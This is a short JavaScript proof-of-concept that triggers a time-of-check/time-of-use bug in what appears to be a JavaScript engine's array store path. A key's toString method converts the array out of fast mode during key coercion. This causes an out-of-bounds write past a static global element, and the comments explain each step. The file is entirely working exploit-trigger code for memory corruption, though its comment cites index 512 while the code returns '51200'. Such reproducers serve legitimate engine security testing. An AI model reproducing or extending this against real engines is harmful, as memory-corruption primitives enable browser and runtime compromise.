var arr = new Array(1024);
for (var i = 0; i < 1024; i++) arr[i] = i;

var key = {
  toString: function() {
    // Force the array out of fast mode during key coercion.
    // Defining an accessor property triggers convertIntoNonFastMode(),
    // which sets m_fastModeData = &DummyArrayElement (a single static global).
    Object.defineProperty(arr, '0', { get: function() { return 42; } });
    arr.length = 999999;
    // Return a large index so the write goes far past DummyArrayElement.
    return '51200';
  }
};

// Trigger: SetObjectOperation reads isFastModeArray()=true, then toString()
// converts to non-fast, then arr->m_fastModeData[512] = value → OOB write.
arr[key] = 0xdeadbeef;
